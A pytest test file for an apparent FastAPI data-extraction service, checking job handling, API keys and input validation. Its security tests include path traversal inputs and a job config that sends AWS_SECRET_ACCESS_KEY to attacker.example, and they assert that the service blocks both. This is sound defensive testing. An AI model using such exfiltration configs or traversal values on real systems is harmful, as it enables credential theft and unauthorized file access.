import shutil

import pytest

pytest.importorskip("fastapi")
from fastapi.testclient import TestClient

from trufax.api import create_app

BUDGET_JOB = (
    "job: budget\n"
    "pack: public-finance\n"
    "entity: BudgetLine\n"
    "source:\n"
    "  type: pdf\n"
    "  start_urls: [budget.pdf]\n"
    "  pdf:\n"
    "    totals:\n"
    "      - {label_field: line_item, label_regex: '^Total General Fund', "
    "sum_fields: [amount]}\n"
    "      - {label_field: line_item, label_regex: '^Total ', sum_fields: [amount]}\n"
    "  fields:\n"
    "    line_item: Revenue Source\n"
    "    amount: FY2026 Proposed\n"
    "output: {formats: [csv, json]}\n"
)


@pytest.fixture
def client(tmp_path, examples, monkeypatch):
    monkeypatch.delenv("TRUFAX_API_KEY", raising=False)
    home = tmp_path / "home"
    app = create_app(home)
    shutil.copy(examples / "budget" / "general-fund-revenue.pdf", home / "data" / "budget.pdf")
    return TestClient(app)


def test_health_and_packs(client):
    assert client.get("/health").json()["status"] == "ok"
    packs = {p["pack"]: p for p in client.get("/v1/packs").json()}
    assert "Property" in packs["real-estate"]["entities"]
    assert client.get("/v1/packs/nope").status_code == 404


def test_job_lifecycle_and_run(client):
    r = client.put("/v1/jobs/budget", content=BUDGET_JOB)
    assert r.status_code == 200, r.text
    assert r.json()["fields"][0] == "entity_name"
    assert client.get("/v1/jobs").json() == ["budget"]
    assert "pack: public-finance" in client.get("/v1/jobs/budget").text

    run = client.post("/v1/jobs/budget/runs?wait=true").json()
    assert run["status"] == "passed", run
    assert run["manifest"]["counts"]["valid"] == 10
    rid = run["run_id"]

    assert client.get(f"/v1/runs/{rid}").json()["status"] == "passed"
    assert "All checks passed" in client.get(f"/v1/runs/{rid}/report").text
    rows = client.get(f"/v1/runs/{rid}/data").json()
    assert len(rows) == 10 and rows[0]["line_item"] == "Personal Income Tax"
    assert client.get(f"/v1/runs/{rid}/data?format=csv").text.startswith("﻿entity_name")
    assert client.get(f"/v1/runs/{rid}/data?format=xlsx").status_code == 404  # not produced
    assert [x["run_id"] for x in client.get("/v1/runs?job=budget").json()] == [rid]

    assert client.delete("/v1/jobs/budget").status_code == 204
    assert client.get("/v1/jobs/budget").status_code == 404


def test_background_run_finishes(client):
    client.put("/v1/jobs/budget", content=BUDGET_JOB)
    r = client.post("/v1/jobs/budget/runs?limit=3")
    assert r.status_code == 202 and r.json()["run_id"].endswith("-sample")
    import time

    for _ in range(100):
        state = client.get(f"/v1/runs/{r.json()['run_id']}").json()
        if state["status"] not in ("queued", "running"):
            break
        time.sleep(0.05)
    assert state["status"] == "passed"
    assert state["manifest"]["counts"]["extracted"] == 3


def test_rejects_bad_jobs(client, tmp_path):
    assert client.put("/v1/jobs/Bad", content=BUDGET_JOB).status_code == 400
    assert client.put("/v1/jobs/other", content=BUDGET_JOB).status_code == 422  # name mismatch
    outside = tmp_path / "secret.pdf"
    outside.write_bytes(b"%PDF")
    escaping = BUDGET_JOB.replace("[budget.pdf]", f"[{outside}]")
    r = client.put("/v1/jobs/budget", content=escaping)
    assert r.status_code == 422 and "outside the allowed data folder" in r.text
    traversal = BUDGET_JOB.replace("[budget.pdf]", "[../../secret.pdf]")
    assert client.put("/v1/jobs/budget", content=traversal).status_code == 422
    assert client.get("/v1/runs/..%2F..%2Fetc").status_code in (400, 404)
    assert client.post("/v1/jobs/missing/runs").status_code == 404


def test_api_key(client, monkeypatch):
    monkeypatch.setenv("TRUFAX_API_KEY", "s3cret")
    assert client.get("/v1/packs").status_code == 401
    assert client.get("/v1/packs", headers={"Authorization": "Bearer wrong"}).status_code == 401
    assert client.get("/v1/packs", headers={"Authorization": "Bearer s3cret"}).status_code == 200
    assert client.get("/v1/packs", headers={"X-API-Key": "s3cret"}).status_code == 200
    assert client.get("/health").status_code == 200  # health stays open


def test_api_jobs_cannot_read_other_environment_variables(client, monkeypatch):
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "do-not-leak")
    leaky = (
        "job: leaky\n"
        "source:\n"
        "  type: json\n"
        "  start_urls: [https://attacker.example/collect]\n"
        "  fetch: {headers: {X-Steal: '${env:AWS_SECRET_ACCESS_KEY}'}}\n"
        "  fields: {x: x}\n"
    )
    assert client.put("/v1/jobs/leaky", content=leaky).status_code == 200
    run = client.post("/v1/jobs/leaky/runs?wait=true").json()
    assert run["status"] == "failed"
    assert "not allowed here" in run["error"] and "do-not-leak" not in run["error"]
